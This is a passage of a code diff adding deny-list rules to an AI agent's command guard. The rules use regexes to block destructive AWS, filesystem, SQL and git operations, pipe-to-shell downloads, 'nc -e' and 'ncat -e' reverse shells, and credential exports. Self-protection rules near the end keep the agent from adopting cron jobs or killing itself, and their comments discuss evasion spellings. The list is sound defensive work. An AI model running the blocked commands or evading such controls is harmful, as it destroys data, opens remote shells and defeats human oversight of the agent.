+        id="aws-destructive-ec2-create-security-group",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+ec2(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+create-security-group.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws ec2 create-security-group', which creates new network access-control "
+            "groups that can widen the attack surface."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-ec2-authorize-security-group",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+ec2(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+authorize-security-group-(ingress|egress).*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws ec2 authorize-security-group-ingress/egress', which opens firewall "
+            "rules and can expose resources to the public internet."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-iam-privilege-mutate",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+iam(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+(create-role|create-policy|create-policy-version|put-role-policy|attach-role-policy|create-instance-profile|add-role-to-instance-profile|pass-role).*",
+        category="aws-destructive",
+        description=(
+            "Blocks IAM role/policy creation, attachment, and pass-role operations, which grant "
+            "or escalate privileges and are a classic privilege-escalation vector."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-cfn-termination-protection",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+cloudformation(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+update-termination-protection.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws cloudformation update-termination-protection', which can disable the "
+            "safeguard that prevents accidental stack deletion."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-dynamodb-delete-table",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+dynamodb(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-table.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws dynamodb delete-table', which permanently deletes a DynamoDB table and "
+            "every item it holds."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-ec2-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+ec2(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws ec2 delete-*' command, which removes EC2 resources such as VPCs, "
+            "subnets, volumes, snapshots, or security groups."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-ec2-terminate-instances",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+ec2(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+terminate-instances.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws ec2 terminate-instances', which permanently shuts down and deletes "
+            "running EC2 instances."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-ssm-send-command",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+ssm(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+send-command.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws ssm send-command', which executes arbitrary commands on managed "
+            "instances (remote code execution across the fleet)."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-ssm-start-session",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+ssm(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+start-session.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws ssm start-session', which opens an interactive shell onto a managed "
+            "instance, bypassing normal access controls."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-ssm-get-command-invocation",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+ssm(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+get-command-invocation.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws ssm get-command-invocation', which reads the output of remotely "
+            "executed SSM commands (used to harvest results of injected commands)."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-ssm-list-command-invocations",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+ssm(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+list-command-invocations.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws ssm list-command-invocations', which enumerates remote-command "
+            "execution history on managed instances."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-ecr-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+ecr(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws ecr delete-*' command, which removes container image repositories "
+            "or images and can break deployments relying on them."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-ecs-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+ecs(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws ecs delete-*' command, which tears down ECS clusters, services, or "
+            "task definitions and can cause service outages."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-eks-delete-cluster",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+eks(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-cluster.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws eks delete-cluster', which destroys an entire Kubernetes control plane "
+            "and all workloads running on it."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-elasticache-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+elasticache(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws elasticache delete-*' command, which removes Redis/Memcached "
+            "clusters and destroys their cached data."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-elb-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+elb(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws elb delete-*' command (classic load balancers), which can drop "
+            "traffic routing and cause an outage."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-elbv2-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+elbv2(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws elbv2 delete-*' command (ALB/NLB load balancers, listeners, target "
+            "groups), which can drop traffic routing and cause an outage."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-glue-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+glue(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws glue delete-*' command, which removes Glue databases, tables, "
+            "jobs, or crawlers and can break data pipelines."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-iam-create-access-key",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+iam(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+create-access-key.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws iam create-access-key', which mints long-lived programmatic "
+            "credentials that can be exfiltrated for persistent access."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-iam-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+iam(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws iam delete-*' command, which removes roles, users, policies, or "
+            "access keys and can lock out legitimate access."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-kinesis-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+kinesis(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws kinesis delete-*' command, which removes data streams and discards "
+            "in-flight records."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-kms-schedule-key-deletion",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+kms(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+schedule-key-deletion.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws kms schedule-key-deletion', which queues a KMS key for deletion and "
+            "can permanently render all data encrypted under it unrecoverable."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-lambda-delete-function",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+lambda(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-function.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws lambda delete-function', which removes a serverless function and can "
+            "break dependent workflows."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-logs-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+logs(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws logs delete-*' command, which deletes CloudWatch log "
+            "groups/streams and can destroy audit and forensic evidence."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-opensearch-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+opensearch(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws opensearch delete-*' command, which removes OpenSearch domains and "
+            "destroys their indexed data."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-rds-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+rds(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws rds delete-*' command, which removes RDS instances, clusters, or "
+            "snapshots and can cause irreversible data loss."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-redshift-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+redshift(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws redshift delete-*' command, which removes Redshift clusters or "
+            "snapshots and can cause irreversible data-warehouse loss."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-route53-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+route53(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws route53 delete-*' command, which removes DNS hosted zones or "
+            "records and can take domains offline."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-s3-rb",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+s3(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+rb.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws s3 rb', which removes an S3 bucket (with --force, deleting all its "
+            "objects)."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-s3-rm",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+s3(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+rm.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws s3 rm', which deletes S3 objects (recursively with --recursive) and "
+            "can wipe stored data."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-s3api-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+s3api(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws s3api delete-*' command, which removes buckets, objects, object "
+            "versions, or bucket configs and can cause data loss."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-s3api-put-object",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+s3api(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+put-object.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws s3api put-object', which writes/overwrites S3 objects and can corrupt "
+            "data or stage exfiltrated content."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-s3api-copy-object",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+s3api(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+copy-object.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws s3api copy-object', which overwrites S3 objects or duplicates data "
+            "across buckets (a data-movement/exfil vector)."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-s3api-multipart-upload",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+s3api(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+(create-multipart-upload|upload-part|upload-part-copy|complete-multipart-upload).*",
+        category="aws-destructive",
+        description=(
+            "Blocks S3 multipart-upload operations "
+            "(create/upload-part/upload-part-copy/complete), which write large objects into S3 "
+            "and can overwrite data or stage exfiltration."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-s3api-put-bucket",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+s3api(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+put-bucket-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws s3api put-bucket-*' command, which mutates bucket configuration "
+            "such as policy, ACL, encryption, or public-access settings and can weaken data "
+            "protections."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-secretsmanager-delete-secret",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+secretsmanager(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-secret.*",
+        category="aws-destructive",
+        description=(
+            "Blocks 'aws secretsmanager delete-secret', which removes stored secrets and can "
+            "break every service depending on them."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-sns-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+sns(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws sns delete-*' command, which removes SNS topics or subscriptions "
+            "and can silently break notification delivery."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-sqs-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+sqs(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws sqs delete-*' command, which removes SQS queues or purges messages "
+            "and can drop in-flight work."
+        ),
+    ),
+    DeniedCommandRule(
+        id="aws-destructive-stepfunctions-delete",
+        pattern="aws(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+stepfunctions(?:\\s+--?[a-z-]+(?:[= ]\\S+)?)*\\s+delete-.*",
+        category="aws-destructive",
+        description=(
+            "Blocks any 'aws stepfunctions delete-*' command, which removes Step Functions "
+            "state machines or activities and can break orchestration workflows."
+        ),
+    ),
+    DeniedCommandRule(
+        id="iac-teardown-cdk-destroy",
+        pattern="cdk destroy.*",
+        category="iac-teardown",
+        description=(
+            "Blocks `cdk destroy`, which tears down an entire AWS CDK stack and all its "
+            "provisioned cloud resources — irreversible infrastructure and data loss."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chmod-777",
+        pattern="chmod 777.*",
+        category="local-destructive",
+        description=(
+            "Blocks chmod 777, which grants world read/write/execute permissions and creates a "
+            "serious security exposure."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chmod-usr",
+        pattern="chmod.*/usr/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chmod changes to /usr, which can corrupt permissions on system binaries and "
+            "break the OS."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chmod-etc",
+        pattern="chmod.*/etc/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chmod changes to /etc, which can corrupt permissions on critical system "
+            "config files and break the OS."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chmod-sbin",
+        pattern="chmod.*/sbin/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chmod changes to /sbin, which can corrupt permissions on privileged system "
+            "binaries and break the OS."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chmod-boot",
+        pattern="chmod.*/boot/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chmod changes to /boot, which can corrupt permissions on boot/kernel files "
+            "and render the system unbootable."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chmod-lib",
+        pattern="chmod.*/lib/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chmod changes to /lib, which can corrupt permissions on shared system "
+            "libraries and break the OS."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chmod-lib64",
+        pattern="chmod.*/lib64/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chmod changes to /lib64, which can corrupt permissions on 64-bit shared "
+            "system libraries and break the OS."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chown-usr",
+        pattern="chown.*/usr/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chown changes to /usr, which can corrupt ownership on system binaries and "
+            "break the OS."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chown-etc",
+        pattern="chown.*/etc/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chown changes to /etc, which can corrupt ownership on critical system "
+            "config files and break the OS."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chown-sbin",
+        pattern="chown.*/sbin/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chown changes to /sbin, which can corrupt ownership on privileged system "
+            "binaries and break the OS."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chown-boot",
+        pattern="chown.*/boot/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chown changes to /boot, which can corrupt ownership on boot/kernel files "
+            "and render the system unbootable."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chown-lib",
+        pattern="chown.*/lib/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chown changes to /lib, which can corrupt ownership on shared system "
+            "libraries and break the OS."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-chown-lib64",
+        pattern="chown.*/lib64/.*",
+        category="local-destructive",
+        description=(
+            "Blocks chown changes to /lib64, which can corrupt ownership on 64-bit shared "
+            "system libraries and break the OS."
+        ),
+    ),
+    DeniedCommandRule(
+        id="pipe-to-shell-curl-bash",
+        pattern="curl .* \\| bash",
+        category="pipe-to-shell",
+        description=(
+            "Blocks piping a curl download directly into bash, which executes arbitrary remote "
+            "code with no chance to inspect the script first."
+        ),
+    ),
+    DeniedCommandRule(
+        id="pipe-to-shell-curl-sh",
+        pattern="curl .* \\| sh",
+        category="pipe-to-shell",
+        description=(
+            "Blocks piping a curl download directly into sh, which executes arbitrary remote "
+            "code with no chance to inspect the script first."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-dd-if",
+        pattern="dd if=.*",
+        category="local-destructive",
+        description=(
+            "Blocks dd invocations with an input file, which can overwrite raw disks/partitions "
+            "and cause irreversible data loss."
+        ),
+    ),
+    DeniedCommandRule(
+        id="sql-drop-database",
+        pattern="(?i:DROP\\s+DATABASE.*)",
+        category="sql",
+        description=(
+            "Blocks SQL DROP DATABASE statements, which irreversibly delete an entire database "
+            "and all its tables and data. Matches the statement's text anywhere on the command "
+            "line, quoted text and heredoc bodies included; prose that mentions it is written "
+            "with the file-editing tool and passed by path."
+        ),
+    ),
+    DeniedCommandRule(
+        id="sql-drop-table",
+        pattern="(?i:DROP\\s+TABLE.*)",
+        category="sql",
+        description=(
+            "Blocks SQL DROP TABLE statements, which permanently delete a table and every row "
+            "it contains. Matches the statement's text anywhere on the command line, quoted "
+            "text and heredoc bodies included; prose that mentions it is written with the "
+            "file-editing tool and passed by path."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-export-aws-access",
+        pattern="export AWS_ACCESS.*",
+        category="credential-exfil",
+        description=(
+            "Blocks `export AWS_ACCESS...`, which injects an attacker-chosen AWS access key ID "
+            "into the environment for later use by AWS tooling."
+        ),
+    ),
+    DeniedCommandRule(
+        id="credential-exfil-export-aws-secret",
+        pattern="export AWS_SECRET.*",
+        category="credential-exfil",
+        description=(
+            "Blocks `export AWS_SECRET...`, which injects an attacker-chosen AWS secret access "
+            "key into the environment for later use by AWS tooling."
+        ),
+    ),
+    DeniedCommandRule(
+        id="git-publish-push-bare",
+        pattern=".*git\\s+(-\\S+\\s+[^-]\\S*\\s+|-\\S+\\s+)*push\\s*$",
+        category="git-publish",
+        description=(
+            "Blocks a bare 'git push' with no explicit remote or branch, which pushes the "
+            "current branch to its default upstream (often a protected branch like main) "
+            "without confirmation."
+        ),
+    ),
+    DeniedCommandRule(
+        id="git-publish-push-single-arg",
+        pattern=".*git\\s+(-\\S+\\s+[^-]\\S*\\s+|-\\S+\\s+)*push\\s+\\S+\\s*$",
+        category="git-publish",
+        description=(
+            "Blocks 'git push <remote>' with a single argument (no branch), which pushes to the "
+            "configured upstream and can publish to a protected branch unattended."
+        ),
+    ),
+    DeniedCommandRule(
+        id="git-publish-push-ambiguous-ref",
+        pattern=".*git\\s+(-\\S+\\s+[^-]\\S*\\s+|-\\S+\\s+)*push\\s+.*[\\s:]\\+?(head|@|fetch_head)(\\s.*|$)",
+        category="git-publish",
+        description=(
+            "Blocks 'git push' whose destination is a symbolic ref that resolves at run time "
+            "(HEAD, @, FETCH_HEAD) — if the checked-out branch is a protected one, this "
+            "publishes to it, and the target cannot be verified before the push runs."
+        ),
+    ),
+    DeniedCommandRule(
+        id="git-publish-push-protected-branch-name",
+        pattern=".*git\\s+(-\\S+\\s+[^-]\\S*\\s+|-\\S+\\s+)*push\\s+.*[\\s:]\\+?(main|mainline|master)(\\s.*|$)",  # wokeignore:rule=master
+        category="git-publish",
+        description=(
+            "Blocks 'git push' whose refspec targets a protected default branch, including "
+            "force-push '+' refspecs, preventing unreviewed writes to the trunk."
+        ),
+    ),
+    DeniedCommandRule(
+        id="git-publish-push-protected-ref-path",
+        pattern=".*git\\s+(-\\S+\\s+[^-]\\S*\\s+|-\\S+\\s+)*push\\s+.*(refs/)?(heads/|remotes/[^/\\s]+/)(main|mainline|master)(\\s.*|$)",  # wokeignore:rule=master
+        category="git-publish",
+        description=(
+            "Blocks 'git push' targeting a fully-qualified ref path (refs/heads/ or "
+            "remotes/<remote>/) for a protected default branch, catching path-style "
+            "evasions of the trunk-push guard."
+        ),
+    ),
+    DeniedCommandRule(
+        id="git-publish-push-wildcard-refspec",
+        pattern=".*git\\s+(-\\S+\\s+[^-]\\S*\\s+|-\\S+\\s+)*push\\s+[^&|;\\n]*\\*",
+        category="git-publish",
+        description=(
+            "Blocks 'git push' with a wildcard '*' refspec, which can mass-publish many "
+            "branches (potentially including protected ones) in a single command."
+        ),
+    ),
+    DeniedCommandRule(
+        id="git-publish-push-brace-expansion-refspec",
+        pattern=".*git\\s+(-\\S+\\s+[^-]\\S*\\s+|-\\S+\\s+)*push\\s+[^&|;\\n]*\\{[^{}]*(,|\\.\\.)[^{}]*\\}",
+        category="git-publish",
+        description=(
+            "Blocks 'git push' using shell brace-expansion (e.g. {a,b} or {1..3}) in the "
+            "refspec, which expands to multiple branch targets and could push to a protected "
+            "branch."
+        ),
+    ),
+    DeniedCommandRule(
+        id="git-publish-push-mirror-all",
+        pattern=".*git\\s+(-\\S+\\s+[^-]\\S*\\s+|-\\S+\\s+)*push\\s+.*--(mirror|all)(\\s.*|$)",
+        category="git-publish",
+        description=(
+            "Blocks 'git push --mirror' and 'git push --all', which push every local ref/branch "
+            "to the remote and can overwrite or publish protected branches wholesale."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-git-reset-hard",
+        pattern="git reset --hard.*",
+        category="local-destructive",
+        description=(
+            "Blocks git reset --hard, which discards uncommitted changes and rewrites the "
+            "working tree, causing irreversible loss of local work."
+        ),
+    ),
+    DeniedCommandRule(
+        id="iac-teardown-kubectl-delete-namespace",
+        pattern="kubectl delete namespace.*",
+        category="iac-teardown",
+        description=(
+            "Blocks `kubectl delete namespace`, which deletes a Kubernetes namespace and "
+            "cascades to every workload, service, and volume inside it — irreversible "
+            "cluster-wide teardown."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-mkfs",
+        pattern="mkfs.*",
+        category="local-destructive",
+        description=(
+            "Blocks mkfs (and mkfs.* variants), which formats a filesystem and destroys all "
+            "existing data on the target device."
+        ),
+    ),
+    DeniedCommandRule(
+        id="reverse-shell-nc",
+        pattern=_NETCAT_EXEC_PATTERN,
+        category="reverse-shell",
+        description=(
+            "Blocks 'nc -e', which spawns a netcat reverse shell handing remote command "
+            "execution to an attacker. Anchored to the `nc` command token -- bare, "
+            "path-qualified (`/usr/bin/nc`), or after a wrapper or a shell separator -- so "
+            "an unrelated command that merely ends in the same letters, such as "
+            "`rsync -e ssh`, is not a reverse shell."
+        ),
+    ),
+    DeniedCommandRule(
+        id="reverse-shell-ncat",
+        pattern="ncat -e.*",
+        category="reverse-shell",
+        description=(
+            "Blocks 'ncat -e', which spawns an ncat reverse shell handing remote command "
+            "execution to an attacker."
+        ),
+    ),
+    DeniedCommandRule(
+        id="iac-teardown-pulumi-destroy",
+        pattern="pulumi destroy.*",
+        category="iac-teardown",
+        description=(
+            "Blocks `pulumi destroy`, which deletes all cloud resources managed by a Pulumi "
+            "stack — irreversible infrastructure teardown."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-rm-rf-root",
+        pattern="rm -rf /.*",
+        category="local-destructive",
+        description=(
+            "Blocks recursive force-deletion rooted at the filesystem root (rm -rf /...), which "
+            "can wipe the entire operating system and all data."
+        ),
+    ),
+    DeniedCommandRule(
+        id="local-destructive-rm-rf-home",
+        pattern="rm -rf ~.*",
+        category="local-destructive",
+        description=(
+            "Blocks recursive force-deletion of the user home directory (rm -rf ~...), which "
+            "would destroy all personal files and config."
+        ),
+    ),
+    DeniedCommandRule(
+        id="iac-teardown-terraform-destroy",
+        pattern="terraform destroy.*",
+        category="iac-teardown",
+        description=(
+            "Blocks `terraform destroy`, which destroys every resource tracked in the Terraform "
+            "state — irreversible infrastructure and data loss."
+        ),
+    ),
+    DeniedCommandRule(
+        id="sql-truncate-table",
+        pattern="(?i:TRUNCATE\\s+TABLE.*)",
+        category="sql",
+        description=(
+            "Blocks SQL TRUNCATE TABLE statements, which delete all rows in a table in one "
+            "unrecoverable operation. Matches the statement's text anywhere on the command "
+            "line, quoted text and heredoc bodies included; prose that mentions it is written "
+            "with the file-editing tool and passed by path."
+        ),
+    ),
+    DeniedCommandRule(
+        id="pipe-to-shell-wget-bash",
+        pattern="wget .* \\| bash",
+        category="pipe-to-shell",
+        description=(
+            "Blocks piping a wget download directly into bash, which executes arbitrary remote "
+            "code with no chance to inspect the script first."
+        ),
+    ),
+    # The ``restart`` / ``update`` / ``file-delivery approve`` / ``cloud <lifecycle>`` /
+    # ``gateway restart`` self-management commands have NO catalog row.  A regex row opening
+    # with an unbounded any-run before the product name matches the name in a worktree path
+    # plus the verb word later (``ls ~/kirocrew-wt/restart.log``), and protects nothing the
+    # structural floor does not.  Enforcement is the argv floor alone
+    # (``argv_floor._is_self_restart`` and siblings, ungated -- see
+    # ``_SELF_PROTECTION_UNGATED_FLOOR_IDS``), which requires the product to be
+    # the argv's own PROGRAM and the action its leading subcommand.
+    DeniedCommandRule(
+        id="self-protection-cron-adopt",
+        pattern=".*kiro.?crew\\b(?:(?!&&)[^;|])*?\\bcron\\b(?:(?!&&)[^;|])*?\\badopt\\b.*",
+        category="self-protection",
+        description=(
+            "Blocks 'kirocrew cron adopt' so the agent cannot assign itself ownership of a "
+            "scheduled job. A cron's owning session both manages the job and receives its "
+            "output, and the MCP cron tools deliberately cannot write that field -- without "
+            "this rule a session could reach the same power through bash and claim a job that "
+            "belongs to another session. The gaps between the words tolerate anything that is "
+            "not a command separator, rather than enumerating what may sit there: the CLI "
+            "accepts '-v'/'--verbose' and '--no-jail' before a subcommand, a shell redirection "
+            "is legal anywhere in a simple command, and $IFS is a word separator too, so an "
+            "allow-list of interlopers would need extending on each new spelling. A single '&' "
+            "is allowed through because '2>&1' is a redirection, while '&&' still ends the "
+            "match: the three words have to belong to ONE simple command."
+        ),
+    ),
+    DeniedCommandRule(
+        id="self-protection-kill",
+        # Scoped to the KILL TARGET, not to co-occurrence anywhere in the command.
+        # The alternation is wrapped in a non-capturing group deliberately: a
+        # TOP-LEVEL ``|`` fails ``is_safe_user_regex``, which would DISABLE this
+        # rule outright (``_DenyMatcher`` skips unsafe patterns) rather than
+        # narrow it.
+        #
